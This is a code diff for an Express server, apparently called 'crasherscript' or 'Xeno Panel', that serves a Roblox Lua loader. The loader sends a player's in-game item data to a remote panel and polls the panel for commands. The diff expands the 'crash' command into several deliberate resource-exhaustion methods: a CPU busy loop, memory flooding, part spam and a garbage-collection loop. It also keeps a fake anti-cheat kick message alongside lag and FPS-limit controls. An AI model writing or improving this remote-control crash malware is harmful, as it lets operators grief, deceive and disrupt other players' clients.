@@ -5,16 +5,19 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Use PUBLIC_URL env var, then RENDER_EXTERNAL_URL, then your new Railway URL as final fallback
-const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'crasherscript-production.up.railway.app';
+// Use PUBLIC_URL env var, then RENDER_EXTERNAL_URL, then your Railway URL as final fallback
+const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://crasherscript-production.up.railway.app';
 
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
 const players = new Map();
 
+// ============================================
+// LOADER SCRIPT - Served to Roblox clients
+// ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Panel Client v3 ]]--
+    const loader = `--[[ Xeno Panel Client v3 ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY  = "xenooooo"
 
@@ -61,13 +64,12 @@ local function serverPlayers()
     return t
 end
 
--- Improved brainrot collection with fallback mechanisms
+-- Brainrot collection
 local function collectBrainrots()
     local list = {}
     local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
     if not pg then return list end
     
-    -- Try multiple possible GUI locations
     local possibleGUIs = {
         "DuelsMachineSession",
         "DuelsMachine",
@@ -84,7 +86,6 @@ local function collectBrainrots()
     end
     if not gui then return list end
     
-    -- Find any frame that might contain brainrot data
     local targetFrame = nil
     local function findFrame(container)
         if not container then return end
@@ -100,11 +101,9 @@ local function collectBrainrots()
     
     targetFrame = findFrame(gui)
     if not targetFrame then 
-        -- Try direct child
         targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
     end
     if not targetFrame then 
-        -- Try to find any frame with children that looks like a list
         for _, child in ipairs(gui:GetDescendants()) do
             if child:IsA("Frame") and #child:GetChildren() > 3 then
                 targetFrame = child
@@ -122,19 +121,15 @@ local function collectBrainrots()
         local title = nil
         local cash = nil
         
-        -- Look for TextLabels and TextButtons with meaningful text
         for _, obj in ipairs(item:GetDescendants()) do
             if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                 local text = obj.Text
-                -- Skip common UI text and numbers that look like IDs
                 if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
-                    -- Check if it looks like a title (contains letters and is reasonable length)
-                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
+                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.match(text, "^%d+$") then
                         if not title or (#text > #title) then
                             title = text
                         end
                     end
-                    -- Check if it looks like cash (contains $, Cookie, Milki, or is a large number)
                     if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or 
                        (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                         cash = text
@@ -143,16 +138,13 @@ local function collectBrainrots()
             end
         end
         
-        -- Only add if we found at least one piece of data and it looks valid
         if title or cash then
-            -- Clean up title
             if title and title ~= "" then
                 title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
             end
             if cash and cash ~= "" then
                 cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
             end
-            -- Don't add if title is just a number
             if title and string.match(title, "^%d+$") and not cash then
                 return
             end
@@ -163,13 +155,10 @@ local function collectBrainrots()
         end
     end
     
-    -- Process all children that look like list items
     local function processAll(container)
         if not container then return end
         for _, child in ipairs(container:GetChildren()) do
-            -- If it's a frame with children, process it as a brainrot item
             if child:IsA("Frame") and #child:GetChildren() > 0 then
-                -- Check if it has text elements that look like a brainrot entry
                 local hasText = false
                 for _, desc in ipairs(child:GetDescendants()) do
                     if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
@@ -181,7 +170,6 @@ local function collectBrainrots()
                     processItem(child)
                 end
             end
-            -- Recursively process nested structures
             if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                 processAll(child)
             end
@@ -190,14 +178,12 @@ local function collectBrainrots()
     
     processAll(targetFrame)
     
-    -- If we found Template children specifically, process them
     for _, child in ipairs(targetFrame:GetChildren()) do
         if child.Name == "Template" and child:IsA("Frame") then
             processItem(child)
         end
     end
     
-    -- If we found no brainrots, try a simpler approach: collect any text from the GUI
     if #list == 0 then
         local simpleBrainrots = {}
         local seenTexts = {}
@@ -206,7 +192,6 @@ local function collectBrainrots()
                 local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                 if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                     seenTexts[text] = true
-                    -- Check if it contains cash indicators
                     local cash = "0"
                     if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                         cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
@@ -250,7 +235,6 @@ local function heartbeat()
             })
         end)
         if not success then
-            -- If the main heartbeat fails, try a minimal version
             local simpleBrainrots = {}
             local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
             if pg then
@@ -400,6 +384,9 @@ local prevLagN = false
 local prevLagC = false
 local prevFps = false
 
+-- ============================================
+-- 🔥 POLL FUNCTION - RECEIVES COMMANDS
+-- ============================================
 local function poll()
     local res = safe(function()
         return request({
@@ -412,13 +399,16 @@ local function poll()
     local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
     if not ok2 or type(data) ~= "table" then return end
 
+    -- FPS LIMIT
     local wantFps = (data.fps_limit == true)
     if wantFps ~= prevFps then
         prevFps = wantFps
         setFpsLimit(wantFps)
     end
 
+    -- LAG NORMAL
     local wantN = (data.lag_n == true)
+    -- LAG CARRY
     local wantC = (data.lag_c == true)
     if wantC ~= prevLagC or wantN ~= prevLagN then
         prevLagC = wantC
@@ -432,15 +422,68 @@ local function poll()
         end
     end
 
+    -- 🔥 CRASH - MULTIPLE METHODS FOR GUARANTEED CRASH
     if data.crash == true then
-        while true do end
+        print("🔥 CRASH COMMAND RECEIVED!")
+        
+        -- Method 1: Infinite loop (fastest)
+        task.spawn(function()
+            while true do
+                -- Busy loop - uses 100% CPU
+                local x = 0
+                for i = 1, 1000000 do
+                    x = x + i
+                end
+            end
+        end)
+        
+        -- Method 2: Memory overload
+        task.spawn(function()
+            local huge = {}
+            for i = 1, 1000000 do
+                huge[i] = {
+                    data = string.rep("X", 10000),
+                    nested = {
+                        value = i,
+                        more = string.rep("Y", 5000)
+                    }
+                }
+            end
+        end)
+        
+        -- Method 3: Spam parts
+        task.spawn(function()
+            for i = 1, 5000 do
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(100, 100, 100)
+                p.Parent = workspace
+                p.Position = Vector3.new(
+                    math.random(-1000, 1000),
+                    math.random(-1000, 1000),
+                    math.random(-1000, 1000)
+                )
+                task.wait()
+            end
+        end)
+        
+        -- Method 4: Trigger garbage collector repeatedly
+        task.spawn(function()
+            while true do
+                task.wait(0.001)
+                collectgarbage()
+                collectgarbage("collect")
+            end
+        end)
     end
+    
+    -- KICK
     if data.kick == true and not kicked then
         kicked = true
         LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
     end
 end
 
+-- Start the script
 heartbeat()
 poll()
 
@@ -451,10 +494,16 @@ end)
 task.spawn(function()
     while task.wait(0.5) do poll() end
 end)`;
+
     res.setHeader('Content-Type', 'text/plain');
     res.send(loader);
 });
 
+// ============================================
+// API ENDPOINTS
+// ============================================
+
+// Heartbeat - players send their status
 app.post('/api/public/heartbeat', (req, res) => {
     const data = req.body;
     if (!data || !data.user_id) {
@@ -463,20 +512,16 @@ app.post('/api/public/heartbeat', (req, res) => {
     const userId = String(data.user_id);
     const existing = players.get(userId) || {};
     
-    // Merge brainrots, keeping existing if new ones are empty or invalid
     let brainrots = data.brainrots || [];
     if (!Array.isArray(brainrots) || brainrots.length === 0) {
-        // Keep existing brainrots if we have them and the new ones are empty
         if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
             brainrots = existing.brainrots;
         }
     } else {
-        // Filter out invalid brainrots
         brainrots = brainrots.filter(b => 
             b && typeof b === 'object' && 
             ((b.title && b.title !== '') || (b.cash && b.cash !== ''))
         );
-        // If filtered brainrots are empty but we had existing ones, keep existing
         if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
             brainrots = existing.brainrots;
         }
@@ -496,23 +541,22 @@ app.post('/api/public/heartbeat', (req, res) => {
     res.json({ status: 'ok' });
 });
 
+// Get all players
 app.get('/api/players', (req, res) => {
     const list = [];
     const now = Date.now();
-    const OFFLINE_THRESHOLD = 15000; // 15 seconds
-    const REMOVE_THRESHOLD = 20 * 60 * 1000; // 20 minutes
+    const OFFLINE_THRESHOLD = 15000;
+    const REMOVE_THRESHOLD = 20 * 60 * 1000;
 
     for (const [id, p] of players.entries()) {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
 
-        // Remove if inactive for 20+ minutes
         if (timeSinceLast >= REMOVE_THRESHOLD) {
             players.delete(id);
             continue;
         }
 
-        // Reset toggles when offline but keep brainrots
         if (!online) {
             p.fps_limit = false;
             p.lag_n = false;
@@ -522,13 +566,13 @@ app.get('/api/players', (req, res) => {
         }
 
         p.online = online;
-        // Keep brainrots even when offline
         list.push({ ...p });
         players.set(id, p);
     }
     res.json({ players: list });
 });
 
+// Get command state for a player
 app.get('/api/command_state', (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
@@ -541,47 +585,68 @@ app.get('/api/command_state', (req, res) => {
     });
 });
 
+// Send command to a player
 app.post('/api/command', (req, res) => {
     const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     const userId = String(user_id);
     const p = players.get(userId);
     if (!p) return res.status(404).json({ error: 'Player not found' });
+    
     if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
     if (lag_n !== undefined) p.lag_n = !!lag_n;
     if (lag_c !== undefined) p.lag_c = !!lag_c;
     if (kick === true) p._kick = true;
-    if (crash === true) p._crash = true;
+    if (crash === true) {
+        p._crash = true;
+        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
+    }
+    
     players.set(userId, p);
     res.json({ status: 'ok' });
 });
 
+// Player polls for commands
 app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     const p = players.get(String(userId));
     if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
+    
     const response = {
         fps_limit: p.fps_limit || false,
         lag_n: p.lag_n || false,
         lag_c: p.lag_c || false,
     };
+    
     if (p._kick) {
         response.kick = true;
         p._kick = false;
+        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
     }
+    
     if (p._crash) {
         response.crash = true;
         p._crash = false;
+        console.log(`💥 CRASH RETRIEVED BY: ${p.username || userId}`);
     }
+    
     players.set(String(userId), p);
     res.json(response);
 });
 
+// ============================================
+// SERVE FRONTEND
+// ============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// ============================================
+// START SERVER
+// ============================================
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`🚀 Xeno Panel Server running on port ${PORT}`);
+    console.log(`📍 Public URL: ${PUBLIC_URL}`);
+    console.log(`📊 Dashboard: ${PUBLIC_URL}/`);
 });
